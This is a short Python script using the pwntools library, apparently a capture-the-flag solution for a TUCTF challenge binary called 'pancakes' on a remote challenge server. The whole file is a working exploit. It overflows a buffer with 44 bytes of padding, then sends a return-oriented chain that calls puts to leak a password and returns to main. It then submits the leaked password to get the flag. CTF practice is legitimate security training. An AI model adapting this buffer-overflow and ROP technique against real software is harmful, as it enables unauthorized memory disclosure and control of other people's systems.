from pwn import *

#r = process("./pancakes")
r = remote("chal.tuctf.com", 30503)
elf = ELF("./pancakes")
rop = ROP(elf)

context.terminal = ["tmux", "splitw", "-v"]
#gdb.attach(r)

rop.puts(0x0804c060)
rop.call(elf.symbols["main"])

r.recv()

payload = ""
payload += "A" * 44
payload += str(rop)
r.sendline(payload)

r.recvline()
password = r.recvline()
r.sendline(password)

r.recv()
print(r.recv())
